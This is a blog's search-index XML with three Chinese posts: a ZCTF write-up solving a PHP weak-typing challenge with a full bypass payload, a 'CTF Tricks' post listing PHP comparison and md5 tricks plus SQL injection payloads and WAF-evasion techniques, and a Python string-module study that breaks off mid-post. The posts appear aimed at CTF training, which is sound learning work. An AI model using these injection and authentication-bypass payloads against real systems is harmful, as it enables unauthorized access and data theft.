<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[ZCTF线下赛php弱类型]]></title>
      <url>http://yoursite.com/2017/04/05/ZCTF%E7%BA%BF%E4%B8%8B%E8%B5%9Bphp%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
      <content type="html"><![CDATA[<h3 id="0x01源码获取"><a href="#0x01源码获取" class="headerlink" title="0x01源码获取"></a>0x01源码获取</h3><p>源码泄露，通过源码泄露工具获得一个php文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">define(<span class="string">'FLAG'</span>,<span class="string">'CTF&#123;THIS_IS_FLAG&#125;'</span>);</div><div class="line">$l01o=<span class="number">0</span>;</div><div class="line">$o1l0=<span class="number">0</span>;</div><div class="line">$o10l=<span class="number">0</span>;</div><div class="line">$lo10=<span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'vhghf'</span>])) <span class="comment">//GET传入一个vhghf</span></div><div class="line">&#123;</div><div class="line">        $vhghf = $_GET[<span class="string">'vhghf'</span>];</div><div class="line">        $vhghf==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; <span class="comment">//如果vhghf等于1则退出</span></div><div class="line">        <span class="keyword">switch</span> ($vhghf)</div><div class="line">        &#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">//如果vhghf等于1则$101o等于1</span></div><div class="line">                $l01o=<span class="number">1</span>;</div><div class="line">                <span class="keyword">echo</span> <span class="string">"1"</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line">$dfgdf=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'dfgdf'</span>]); <span class="comment">//GET传入dfgdf且进行json_decode且创建一个数组</span></div><div class="line"><span class="keyword">if</span>(is_array($dfgdf))&#123;  <span class="comment">//如果为数组则进行接下来的</span></div><div class="line">    is_numeric(@$dfgdf[<span class="string">"gvnghdjk"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; <span class="comment">//判断dfgdf中的gvnghdjk是否为数字或数字字符串</span></div><div class="line">    <span class="keyword">if</span>(@$dfgdf[<span class="string">"gvnghdjk"</span>])&#123;</div><div class="line">        ($dfgdf[<span class="string">"gvnghdjk"</span>]&gt;<span class="number">2017</span>)?$o1l0=<span class="number">1</span>:<span class="keyword">NULL</span>; <span class="comment">//gvnghdjk大于2017</span></div><div class="line">         </div><div class="line">    &#125;</div><div class="line">    var_dump($dfgdf[<span class="string">"uxcndffznb"</span>]);</div><div class="line">    <span class="keyword">if</span>(is_array(@$dfgdf[<span class="string">"uxcndffznb"</span>]))&#123; <span class="comment">//uxcndffznb要为数组</span></div><div class="line">        <span class="keyword">echo</span> <span class="string">"2"</span>;</div><div class="line">        <span class="keyword">if</span>(count($dfgdf[<span class="string">"uxcndffznb"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($dfgdf[<span class="string">"uxcndffznb"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>); <span class="comment">//数组中有两个值，且第一个还要为数组</span></div><div class="line">        $kghdhfghdfgbcvhgffg = array_search(<span class="string">"ZCTF"</span>, $dfgdf[<span class="string">"uxcndffznb"</span>]); <span class="comment">//查询uxcndffznb中有没有ZCTF有则返回1没则返回false</span></div><div class="line">        var_dump($kghdhfghdfgbcvhgffg);</div><div class="line">        $kghdhfghdfgbcvhgffg===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; <span class="comment">//如果为false则退出</span></div><div class="line">        <span class="keyword">foreach</span>($dfgdf[<span class="string">"uxcndffznb"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123; <span class="comment">//查询uxcndffznb中是否有ZCTF如果有则退出</span></div><div class="line">            var_dump($val);</div><div class="line">			</div><div class="line">            $val===<span class="string">"ZCTF"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</div><div class="line">			<span class="keyword">echo</span> $val;</div><div class="line">        &#125;</div><div class="line">        $o10l=<span class="number">1</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"3"</span>.<span class="string">"&lt;br&gt;"</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">$cdggjydcnfsdyjaq = $_GET[<span class="string">'cdggjydcnfsdyjaq'</span>]; <span class="comment">//MD5碰撞</span></div><div class="line"><span class="keyword">if</span> ($cdggjydcnfsdyjaq != <span class="string">'15562'</span>) &#123;</div><div class="line">    <span class="keyword">if</span> (strstr($cdggjydcnfsdyjaq, <span class="string">'2017ZCTF'</span>)) &#123;</div><div class="line">        <span class="keyword">if</span> (substr(md5($cdggjydcnfsdyjaq),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"4"</span>.<span class="string">"&lt;br&gt;"</span>;</div><div class="line">            $lo10=<span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($l01o &amp;&amp; $o1l0 &amp;&amp; $o10l &amp;&amp; $lo10)&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"success,flag:"</span>.FLAG;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>getflag前提：要求($l01o &amp;&amp; $o1l0 &amp;&amp; $o10l &amp;&amp; $lo10)都符合要求了就出flag，而具体看就是要求这四个值都为1</p>
<a id="more"></a>
<h3 id="0x02分析"><a href="#0x02分析" class="headerlink" title="0x02分析"></a>0x02分析</h3><h4 id="l01o"><a href="#l01o" class="headerlink" title="l01o"></a>l01o</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">将vhghf与<span class="number">1</span>进行比较，而且是双等号，直接<span class="number">1</span>+任意字母绕过</div></pre></td></tr></table></figure>
<h4 id="o1l0-o10l"><a href="#o1l0-o10l" class="headerlink" title="o1l0+o10l"></a>o1l0+o10l</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">dfgdf[<span class="string">"gvnghdjk"</span>]&gt;<span class="number">2017</span>与第一个相似，用大于<span class="number">2017</span>的数值加任意字母绕过</div><div class="line"></div><div class="line">array_search是弱类型的比较</div><div class="line">var_dump(in_array(<span class="string">"abc"</span>, $array1));&lt;/br&gt;</div><div class="line">var_dump(in_array(<span class="string">"1bc"</span>, $array2));</div><div class="line">它遍历了array的每个值，并且作<span class="string">"=="</span>比较（“当设置了strict 用===”）</div><div class="line">结果很明显了</div><div class="line">如果array1里面有个值为<span class="number">0</span>，那么第一条返回就会为真<span class="comment">//intval('abc')=0</span></div><div class="line">如果array2里面有个值为<span class="number">1</span>，那么第二条就会为真<span class="comment">//intval('1bc')=1</span></div><div class="line">数字<span class="number">0</span>双等于所有的无数字开头的字符串，可以用<span class="number">0</span>去绕过array_search的比较</div></pre></td></tr></table></figure>
<h4 id="lo10"><a href="#lo10" class="headerlink" title="lo10"></a>lo10</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$cdggjydcnfsdyjaq != '<span class="number">15562</span>'</div><div class="line"></div><div class="line">(substr(md5($cdggjydcnfsdyjaq),<span class="number">8</span>,<span class="number">16</span>) == substr(md5('<span class="number">15562</span>'),<span class="number">8</span>,<span class="number">16</span>))</div></pre></td></tr></table></figure>
<p>线上赛已经出现过</p>
<h3 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">payload=</div><div class="line">?vhghf=<span class="number">1</span>a$&amp;<span class="variable">&amp;dfgdf</span>=&#123;<span class="string">"gvnghdjk"</span>:<span class="string">"2018aaa"</span>,<span class="string">"uxcndffznb"</span>:[[<span class="string">"ZCTF"</span>],<span class="number">0</span>]&#125;&amp;<span class="variable">&amp;cdggjydcnfsdyjaq</span>=x2017ZCTF24834</div></pre></td></tr></table></figure>
<p><img src="http://i1.piimg.com/567571/7fe8c9df09135bd0.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF Tricks]]></title>
      <url>http://yoursite.com/2017/04/05/CTF-Tricks/</url>
      <content type="html"><![CDATA[<h3 id="0x01-php弱类型"><a href="#0x01-php弱类型" class="headerlink" title="0x01 php弱类型"></a>0x01 php弱类型</h3><h4 id="什么是php弱类型"><a href="#什么是php弱类型" class="headerlink" title="什么是php弱类型"></a>什么是php弱类型</h4><p>php变量类型<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">string</div><div class="line">integer</div><div class="line"><span class="keyword">array</span></div><div class="line">double</div><div class="line">object</div><div class="line">resource</div><div class="line"><span class="keyword">NULL</span></div><div class="line"></div><div class="line">string <span class="keyword">array</span> <span class="keyword">NULL</span>  可以从RGPC传入</div><div class="line">遇到不符类型，自动转换</div></pre></td></tr></table></figure></p>
<p>php类型装换<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="string">''</span> == <span class="number">0</span> == <span class="keyword">false</span></div><div class="line"><span class="string">'123'</span> == <span class="number">123</span></div><div class="line"><span class="string">'abc'</span> == <span class="number">0</span></div><div class="line"><span class="string">'123a'</span> == <span class="number">123</span></div><div class="line"><span class="string">'0x01'</span> == <span class="number">1</span></div><div class="line"><span class="string">'0e123456789'</span> == <span class="string">'0e987654321'</span></div><div class="line">[<span class="keyword">false</span>] == [<span class="number">0</span>] == [<span class="keyword">NULL</span>] == [<span class="string">''</span>]</div><div class="line"><span class="keyword">NULL</span> == <span class="keyword">false</span> == <span class="number">0</span></div><div class="line"><span class="keyword">true</span> == <span class="number">1</span></div></pre></td></tr></table></figure></p>
<a id="more"></a>
<h4 id="题型1-scrcmp"><a href="#题型1-scrcmp" class="headerlink" title="题型1 scrcmp"></a>题型1 scrcmp</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">define(<span class="string">'FLAG'</span>,<span class="string">'CTF&#123;THIS_IS_FLAG&#125;'</span>);</div><div class="line"><span class="keyword">if</span> (strcmp($_GET[<span class="string">'flag'</span>],FLAG) == <span class="number">0</span>)&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"success,flag:"</span>.FLAG;</div><div class="line">&#125;</div><div class="line"></div><div class="line">scrcmp:如果 str1 小于 str2 返回 &lt; <span class="number">0</span>； 如果 str1 大于 str2 返回 &gt; <span class="number">0</span>；如果两者相等，返回 <span class="number">0</span></div><div class="line">strcmp比较出错=&gt;返回<span class="keyword">NULL</span>=&gt;<span class="keyword">NULL</span> == <span class="number">0</span> =&gt;</div></pre></td></tr></table></figure>
<p><img src="http://i4.buimg.com/567571/ad87307d19e8920c.png" alt=""></p>
<h4 id="题型2-字符串比较（原值不相等，md5值相等）"><a href="#题型2-字符串比较（原值不相等，md5值相等）" class="headerlink" title="题型2 字符串比较（原值不相等，md5值相等）"></a>题型2 字符串比较（原值不相等，md5值相等）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">define(<span class="string">'FLAG'</span>,<span class="string">'CTF&#123;THIS_IS_FLAG&#125;'</span>);</div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'s1'</span>] != $_GET[<span class="string">'s2'</span>]</div><div class="line">	&amp;&amp; md5($_GET[<span class="string">'s1'</span>]) == md5($_GET[<span class="string">'s2'</span>]))&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"success,flag:"</span>.FLAG;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="http://i2.muimg.com/567571/1b97150d0fd6d935.png" alt=""></p>
<h5 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h5><blockquote>
<p>什么是科学计数法</p>
</blockquote>
<p>‘0e123456789’ == ‘0e987654321’ == 0</p>
<blockquote>
<p>md5值的取值范围</p>
</blockquote>
<p>‘0123456789abcdef’</p>
<blockquote>
<p>[0e+数字]的md5</p>
</blockquote>
<p>md5(‘QNKCDZO’) ==<br>‘0e830400451993494058024219903391’</p>
<p>md5(‘240610708’) ==<br>‘0e462097431906509019562988736854’</p>
<h5 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h5><blockquote>
<p>PHP md5函数特性</p>
</blockquote>
<p>md5([1,2,3]) == md5([4,5,6]) == NULL</p>
<blockquote>
<p>数组Trick,无需再利用弱类型比较特性<br><img src="http://i1.piimg.com/567571/cb2f754cdbe6b79a.png" alt=""><br>总结的一些常用的比较<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">php &gt; var_dump(md5(<span class="string">'240610708'</span>) == md5(<span class="string">'QNKCDZO'</span>));</div><div class="line">  bool(<span class="keyword">true</span>)</div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>),   md5(<span class="string">'QNKCDZO'</span>));                                                                                                                                                    </div><div class="line">  string(<span class="number">32</span>) <span class="string">"0e462097431906509019562988736854"</span></div><div class="line">  string(<span class="number">32</span>) <span class="string">"0e830400451993494058024219903391"</span></div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>) ===   md5(<span class="string">'QNKCDZO'</span>));                                                                                                                                                 </div><div class="line">  bool(<span class="keyword">false</span>)</div><div class="line">  php &gt; var_dump(<span class="string">"0e462097431906509019562988736854"</span> == <span class="string">"0e830400451993494058024219903391"</span>);</div><div class="line">  bool(<span class="keyword">true</span>)</div><div class="line">  php &gt; var_dump(<span class="string">"0e462097431906509019562988736854"</span> === <span class="string">"0e830400451993494058024219903391"</span>);</div><div class="line">  bool(<span class="keyword">false</span>)</div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>) ===   md5(<span class="string">'QNKCDZO'</span>));                                                                                                                                                 </div><div class="line">  bool(<span class="keyword">false</span>)</div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>) ==   md5(<span class="string">'QNKCDZO'</span>));                                                                                       </div><div class="line">  bool(<span class="keyword">true</span>)</div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>) === md5(<span class="string">'QNKCDZO'</span>));</div><div class="line">  bool(<span class="keyword">false</span>)</div></pre></td></tr></table></figure></p>
</blockquote>
<h3 id="题型3-登录逻辑常见考点"><a href="#题型3-登录逻辑常见考点" class="headerlink" title="题型3 登录逻辑常见考点"></a>题型3 登录逻辑常见考点</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$name = addcslashes($_POST[<span class="string">'name'</span>]);</div><div class="line">$r = $db-&gt;get_row(<span class="string">"SELECT `pass` FROM `user` WHERE `name`='&#123;$name&#125;'"</span>);</div><div class="line"><span class="keyword">if</span>($r[<span class="string">'pass'</span>] === md5($_POST[<span class="string">'pass'</span>]))&#123;</div><div class="line">	<span class="comment">//...login success</span></div><div class="line">&#125;</div><div class="line">不存在sql注入漏洞</div><div class="line">密码比较使用严格模式“===”，故此处不存在弱类型比较漏洞</div></pre></td></tr></table></figure>
<p>运行流程:</p>
<p><img src="http://i2.muimg.com/567571/4b6433b7282b4e81.png" alt=""></p>
<blockquote>
<p>NULL的巧妙构造<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">用户不存在=&gt;$r[<span class="string">'pass'</span>]&lt;=&gt;<span class="keyword">NULL</span></div><div class="line">密码是数组=&gt;md5($_POST[<span class="string">'pass'</span>]) ⇔ <span class="keyword">NULL</span></div><div class="line">$r[<span class="string">'pass'</span>] === md5($_POST[<span class="string">'pass'</span>])</div><div class="line"><span class="keyword">NULL</span> === <span class="keyword">NULL</span> 成立</div><div class="line">成功登录！</div></pre></td></tr></table></figure></p>
</blockquote>
<h3 id="0x02-发现源码（题面信息越少，越可能需要找到源码）"><a href="#0x02-发现源码（题面信息越少，越可能需要找到源码）" class="headerlink" title="0x02 发现源码（题面信息越少，越可能需要找到源码）"></a>0x02 发现源码（题面信息越少，越可能需要找到源码）</h3><blockquote>
<p>发现套路<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">题目只给出一个登录框</div><div class="line">页面只有一两行字</div><div class="line">页面中包含Powered XXX</div></pre></td></tr></table></figure></p>
</blockquote>
<p>关于misc查看通讯地址Trick</p>
<p>直接丢到 <a href="https://www.virustotal.com/" target="_blank" rel="external">https://www.virustotal.com/</a> 在 Behavioural information 可以看到通讯地址</p>
<p>源码发掘考点一览<br><img src="http://i2.muimg.com/567571/8ad57cf3994ffdea.png" alt=""></p>
<h3 id="0x03-CTF比赛中的那些WAF与绕过"><a href="#0x03-CTF比赛中的那些WAF与绕过" class="headerlink" title="0x03 CTF比赛中的那些WAF与绕过"></a>0x03 CTF比赛中的那些WAF与绕过</h3><h4 id="题型4-字符串替换WAF"><a href="#题型4-字符串替换WAF" class="headerlink" title="题型4 字符串替换WAF"></a>题型4 字符串替换WAF</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$str = str_replace(<span class="string">"select"</span>, <span class="string">""</span>, $str);</div><div class="line">$str = str_replace(<span class="string">"union"</span>, <span class="string">""</span>, $str);</div><div class="line">$str = str_replace(<span class="string">"into"</span>, <span class="string">""</span>, $str);</div></pre></td></tr></table></figure>
<p>一大堆非常严格的过滤，最后出现一处字符串替换空型WAF</p>
<p>方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test.php?str=<span class="number">-1</span> uniunionon selselectect <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> from `admin` limit <span class="number">1</span></div></pre></td></tr></table></figure></p>
<h4 id="题型5-字符替换空型WAF加强版"><a href="#题型5-字符替换空型WAF加强版" class="headerlink" title="题型5 字符替换空型WAF加强版"></a>题型5 字符替换空型WAF加强版</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$tmp_str = <span class="string">""</span>;</div><div class="line"><span class="keyword">while</span>($tmp_str != $str) &#123;</div><div class="line"> $tmp_str = $str;</div><div class="line"> $str = str_replace(<span class="string">"select"</span>, <span class="string">""</span>, $str);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>通过循环替换转移注意力，实际简单的大小写变换即可绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test.php?str=<span class="number">-1</span> UniON SeLeCT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> FrOM `admin` LiMiT <span class="number">1</span></div></pre></td></tr></table></figure></p>
<h4 id="题型6-特殊字符-串-拦截型WAF"><a href="#题型6-特殊字符-串-拦截型WAF" class="headerlink" title="题型6 特殊字符(串)拦截型WAF"></a>题型6 特殊字符(串)拦截型WAF</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/(\bselect\b|\bunion\b|and|or|;|,|#|\(|\))/is'</span>,</div><div class="line">$_GET[<span class="string">'id'</span>])) &#123;</div><div class="line"> <span class="keyword">exit</span>(<span class="string">'BAD ID'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>####那些常见的SQL Trick<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">[\bselect\b] 或 [\bunion\b]: </div><div class="line">    Mysql条件注释的利用 <span class="comment">/*!50000select*/</span></div><div class="line">    浮点数利用WHERE id=0.1UnIoN <span class="keyword">SeLeCT</span> ...</div><div class="line">[#]</div><div class="line">    Mysql注释符:<span class="comment">/**/</span>,<span class="comment">/*!条件注释*、,--,;,`</span></div><div class="line">[,]</div><div class="line">    盲注 mid(user() from 1 for 1) == mid(user(),1,1)</div><div class="line">    UNION注入 union select * from (select 1)a join (select 2)b ==union select 1,2</div><div class="line">[and] 或 [or]: </div><div class="line">    查缺补漏xor,||,&amp;&amp;.!,not</div><div class="line">[&gt;|=|&lt;] 逻辑操作符:</div><div class="line">    关键字替代符号 between、like、rlike、regex、is</div><div class="line">    与0比较法 -1 or 1=1 and ord(substr(user(),1,1))-114</div><div class="line">[空白符]</div><div class="line">    控制字符替代法20 09 0A 0B 0C 0D A0</div><div class="line">    符号替代法 /**/、select.<span class="string">``</span>.password、<span class="keyword">select</span>+<span class="keyword">user</span>()</div><div class="line">    括号组合法 <span class="keyword">union</span>(<span class="keyword">select</span>(<span class="number">1</span>),<span class="number">2</span>)、<span class="keyword">select</span>&#123;x(<span class="keyword">password</span>)&#125;<span class="keyword">from</span>&#123;x(<span class="keyword">user</span>)&#125;</div></pre></td></tr></table></figure></p>
<p><a href="https://regex101.com/" target="_blank" rel="external">不要害怕正则</a></p>
<p>未完待续！！！！！！！！</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.leavesongs.com/SHARE/some-ctf-tricks-ppt.html" target="_blank" rel="external">CTF比赛总是输？你还差点Tricks!</a></p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[string标准库源码学习]]></title>
      <url>http://yoursite.com/2017/03/29/string%E6%A0%87%E5%87%86%E5%BA%93%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<h3 id="0x00-Contents"><a href="#0x00-Contents" class="headerlink" title="0x00 Contents"></a>0x00 Contents</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">常量定义</div><div class="line"><span class="variable">_TemplateMetaclass</span></div><div class="line">maketrans</div><div class="line"><span class="variable">_multimap</span></div><div class="line">Template</div><div class="line">strop</div><div class="line">Fromatter</div></pre></td></tr></table></figure>
<h3 id="0x01-常量定义"><a href="#0x01-常量定义" class="headerlink" title="0x01 常量定义"></a>0x01 常量定义</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">whitespace = <span class="string">' \t\n\r\v\f'</span>   空白字符  \t制表符  \n换行</div><div class="line">ascii_lowercase = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></div><div class="line">ascii_uppercase = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></div><div class="line">ascii_letters = ascii_lowercase + ascii_uppercase</div><div class="line">digits = <span class="string">'0123456789'</span>   十进制</div><div class="line">hexdigits = digits + <span class="string">'abcdef'</span> + <span class="string">'ABCDEF'</span>  十六进制</div><div class="line">octdigits = <span class="string">'01234567'</span>   八进制</div><div class="line">punctuation = <span class="string">r"""!"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~"""</span>  <span class="comment">#标点符号</span></div><div class="line">printable = digits + ascii_letters + punctuation + whitespace</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>代码上来就是一系列常用的常量定义，知道就行，以后需要用到直接用（比如生成随机字符串，和random配合使用）</p>
<h3 id="0x02-TemplateMetaclass"><a href="#0x02-TemplateMetaclass" class="headerlink" title="0x02 _TemplateMetaclass"></a>0x02 _TemplateMetaclass</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">_TemplateMetaclass</span><span class="params">(type)</span>:</span></div><div class="line">    pattern = <span class="string">r"""</span></div><div class="line">    %(delim)s(?:</div><div class="line">      (?P&lt;escaped&gt;%(delim)s) |   # Escape sequence of two delimiters</div><div class="line">      (?P&lt;named&gt;%(id)s)      |   # delimiter and a Python identifier</div><div class="line">      &#123;(?P&lt;braced&gt;%(id)s)&#125;   |   # delimiter and a braced identifier</div><div class="line">      (?P&lt;invalid&gt;)              # Other ill-formed delimiter exprs</div><div class="line">    )</div><div class="line">    """</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(cls, name, bases, dct)</span>:</span></div><div class="line">        super(_TemplateMetaclass, cls).__init__(name, bases, dct)</div><div class="line">        <span class="keyword">if</span> <span class="string">'pattern'</span> <span class="keyword">in</span> dct:</div><div class="line">            pattern = cls.pattern</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            pattern = _TemplateMetaclass.pattern % &#123;</div><div class="line">                <span class="string">'delim'</span> : _re.escape(cls.delimiter),</div><div class="line">                <span class="string">'id'</span>    : cls.idpattern,</div><div class="line">                &#125;</div><div class="line">        cls.pattern = _re.compile(pattern, cls.flags | _re.VERBOSE)</div></pre></td></tr></table></figure>
<p>_TemplateMetaclass是一个元类，它提供了一个核心功能：</p>
<blockquote>
<p>通过创建出来的类，都有一个pattern属性</p>
<p>该属性能够解析类似于 delimiter{idpattern} 或者 delimiteridpattern的字符串。通过 它创建出来的类，只需要定制delimiter和idpatten的具体值就可拥有以上的功能</p>
<p>如果通过它创建出来的类，也可以自己提供pattern(但最终使用的时候，会被元类自动换成re对象)</p>
<h3 id="0x03-Template"><a href="#0x03-Template" class="headerlink" title="0x03 Template"></a>0x03 Template</h3></blockquote>
